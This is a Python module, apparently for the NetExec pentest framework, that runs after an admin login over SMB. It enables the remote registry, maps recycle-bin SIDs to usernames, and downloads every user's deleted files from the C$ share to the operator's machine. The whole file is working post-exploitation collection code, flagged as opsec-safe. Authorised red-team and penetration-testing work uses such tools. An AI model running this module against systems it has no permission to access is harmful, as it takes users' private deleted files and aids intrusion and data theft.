from io import BytesIO
from os import makedirs
from nxc.paths import NXC_PATH
from os.path import join, abspath
from impacket.dcerpc.v5 import rrp
from impacket.dcerpc.v5.rrp import DCERPCSessionError
from impacket.examples.secretsdump import RemoteOperations


class NXCModule:
    # Module by @Defte_
    # Dumps files from recycle bins

    name = "recyclebin"
    description = "Lists and exports users' recycle bins"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True
    false_positive = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]

    def options(self, context, module_options):
        """"""

    def on_admin_login(self, context, connection):
        found = 0
        try:
            remote_ops = RemoteOperations(connection.conn, False)
            remote_ops.enableRegistry()
        except DCERPCSessionError as e:
            context.log.debug(f"Error connecting to RemoteRegistry {e} on host {connection.host}")
        finally:
            remote_ops.finish()
            
        if remote_ops._RemoteOperations__rrp:
            for sid_directory in connection.conn.listPath("C$",  "$Recycle.Bin\\*"):
                if sid_directory.get_longname() and sid_directory.get_longname() not in self.false_positive:
                
                    # Extracts the username from the SID
                    if remote_ops._RemoteOperations__rrp:
                        ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
                        reg_handle = ans["phKey"]
                        ans = rrp.hBaseRegOpenKey(
                            remote_ops._RemoteOperations__rrp,
                            reg_handle,
                            f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{sid_directory.get_longname()}"
                        )
                        key_handle = ans["phkResult"]
                        _ = username = profileimagepath = None
                        try:
                            _, profileimagepath = rrp.hBaseRegQueryValue(
                                remote_ops._RemoteOperations__rrp, 
                                key_handle, 
                                "ProfileImagePath\x00"
                            )
                            # Get username and remove embedded null byte
                            username = profileimagepath.split("\\")[-1].replace("\x00", "")
                        except rrp.DCERPCSessionError as e:
                            context.log.debug(f"Couldn't get username from SID {e} on host {connection.host}")

                    # Lists for any file or directory in the recycle bin
                    spider_folder = f"$Recycle.Bin\\{sid_directory.get_longname()}\\"
                    paths = connection.spider(
                        "C$", 
                        folder=spider_folder, 
                        regex=[r"(.*)"], 
                        no_print_results=True
                    )

                    false_positiv = [".", "..", "desktop.ini"]
                    filtered_file_paths = [path for path in paths if not path.endswith(tuple(false_positiv))]
                    if filtered_file_paths:
                        if username is not None:
                            context.log.highlight(f"CONTENT FOUND {sid_directory.get_longname()} ({username})")
                        else:
                            context.log.highlight(f"CONTENT FOUND {sid_directory.get_longname()}")

                        for path in filtered_file_paths:
                            # Returned path look like:
                            # $Recycle.Bin\S-1-5-21-4140170355-2927207985-2497279808-500\/$I87021Q.txt
                            # Or
                            # $Recycle.Bin\S-1-5-21-4140170355-2927207985-2497279808-500\/$R87021Q.txt
                            # $I files are metadata while $R are actual files so we split the path from the SID
                            # And check that the filename contains $R only to prevent downloading useless stuff
                
                            if "$R" in path.split(sid_directory.get_longname())[1] and not path.endswith(tuple([".", "..", "desktop.ini"])):
                                try:
                                    buf = BytesIO()
                                    connection.conn.getFile("C$", path, buf.write)
                                    context.log.highlight(f"\t{path}")
                                    found += 1
                                    buf.seek(0)
                                    file_path = path.split('$')[-1].replace("/", "_")
                                    if username:
                                        filename = f"{connection.host}_{username}_recyclebin_{file_path}"
                                    else:
                                        filename = f"{connection.host}_{sid_directory.get_longname()}_recyclebin_{file_path}"
                                    export_path = join(NXC_PATH, "modules", "recyclebin")
                                    path = abspath(join(export_path, filename))
                                    makedirs(export_path, exist_ok=True)
                                    try:
                                        with open(path, "w+") as file:
                                            file.write(buf.read().decode("utf-8", errors="ignore"))
                                    except Exception as e:
                                        context.log.fail(f"Failed to write recyclebin file to {filename}: {e}")
                                except Exception as e:
                                    # Probably trying to getFile a directory which won't work
                                    context.log.debug(f"Couldn't open {path} because of {e}")
            if found >0:
                context.log.highlight(f"Recycle bin's content downloaded to {export_path}")
